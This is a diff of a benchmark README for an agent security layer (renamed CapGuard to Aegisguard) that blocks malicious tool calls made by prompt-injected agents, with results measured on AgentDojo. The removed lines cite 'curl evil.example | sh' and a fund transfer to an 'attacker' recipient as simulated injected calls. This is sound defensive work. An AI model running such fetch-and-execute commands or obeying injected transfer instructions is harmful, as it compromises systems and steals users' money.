@@ -1,8 +1,8 @@
-# CapGuard Benchmark Results
+# Aegisguard Benchmark Results
 
 ## What this measures (and what it does not)
 
-CapGuard is a **deterministic enforcement layer**. This harness measures the
+Aegisguard is a **deterministic enforcement layer**. This harness measures the
 property it is responsible for:
 
 > When a prompt-injected / compromised agent *attempts* a malicious tool call,
@@ -13,8 +13,8 @@ It is **not** a measure of how easily an LLM is fooled into attempting the call
 in the first place — that is the model's susceptibility, which classifier-style
 defenses (LlamaFirewall's PromptGuard2 / AlignmentCheck, CaMeL's quarantined
 LLM) address. The two layers are complementary and composable: a classifier
-lowers how often a malicious call is *attempted*; CapGuard deterministically
-blocks it when it *is* attempted. CapGuard's design point is that it does not
+lowers how often a malicious call is *attempted*; Aegisguard deterministically
+blocks it when it *is* attempted. Aegisguard's design point is that it does not
 rely on probabilistic detection — it cannot be "talked past."
 
 The harness is structured (tool-calling scenarios, benign task + injection
@@ -24,7 +24,7 @@ agent without changing the measurement.
 ## Result (single general "secure profile", no per-attack rules)
 
 ```
-metric                    baseline    CapGuard
+metric                    baseline    Aegisguard
 ----------------------------------------------
 attack success rate        100.0%        0.0%
 benign utility             100.0%      100.0%
@@ -66,8 +66,7 @@ capability attenuation/enforcement, the policy DSL, data provenance
 
 ## Real AgentDojo (deterministic ground-truth replay)
 
-`PYTHONPATH=. python -m capguard.bench.run_agentdojo` (requires `pip install
-agentdojo`) runs CapGuard against the **actual** AgentDojo task suites. It
+`aegis agentdojo` (requires `pip install agentdojo`) runs Aegisguard against the **actual** AgentDojo task suites. It
 replays each task's ground-truth tool-call sequence — the correct solution for a
 user task, the attacker's goal for an injection task — through the enforcement
 runtime. The ground-truth sequence is a faithful, model-free stand-in for what a
@@ -101,15 +100,15 @@ defense, not deterministic enforcement):
 - CaMeL / Progent / Task Shield / MELON: reported <2% ASR on AgentDojo
   "important instructions".
 
-CapGuard's deterministic layer is intended to sit underneath any of these as
+Aegisguard's deterministic layer is intended to sit underneath any of these as
 the non-bypassable backstop. The roadmap item is to wire the live-LLM AgentDojo
-adapter and publish end-to-end ASR with CapGuard as the enforcement layer.
+adapter and publish end-to-end ASR with Aegisguard as the enforcement layer.
 
 ## Reproduce
 ```bash
-PYTHONPATH=. python -m capguard.bench.run_bench      # prints table, writes bench_results.json
+aegis bench                                          # prints table, writes bench_results.json
 PYTHONPATH=. python -m pytest tests/test_bench.py    # CI regression gate (ASR=0, utility=100)
-python examples/e2e_realtime_validate.py             # benchmark + live loopback HTTP MCP validation
+python examples/demo_comparison.py                   # side-by-side: unprotected vs protected
 ```
 
 ## Where the With/Without Calls Live
@@ -117,22 +116,16 @@ python examples/e2e_realtime_validate.py             # benchmark + live loopback
 For a human-readable side-by-side test, run:
 
 ```bash
-python examples/e2e_realtime_validate.py
+python examples/demo_comparison.py
 ```
 
-The script defines the agentic tool functions in
-`examples/e2e_realtime_validate.py`:
+The script runs the same attack scenarios against both an unprotected agent
+(raw tool calls) and an Aegisguard-protected agent, then prints a comparison
+table. For the full local validation suite (40 tests, no API key needed):
 
-- `build_agentic_runtime()` defines raw Python tools: `run_shell(cmd)` and
-  `transfer(amount, recipient)`.
-- `run_side_by_side_agentic_calls()` calls those raw tools **without CapGuard**
-  and then calls the same tools through `AgentRuntime.invoke_tool(...)`
-  **with CapGuard**.
-- The expected proof is visible in the terminal:
-  - without CapGuard, `curl evil.example | sh` executes as a simulated raw tool call;
-  - with CapGuard, the same shell command is blocked by argument enforcement;
-  - without CapGuard, `transfer(..., recipient="attacker")` executes;
-  - with CapGuard, the same transfer is blocked by provenance policy.
+```bash
+python examples/demo_local_no_api.py
+```
 
 The full deterministic benchmark uses the same pattern at scale:
 
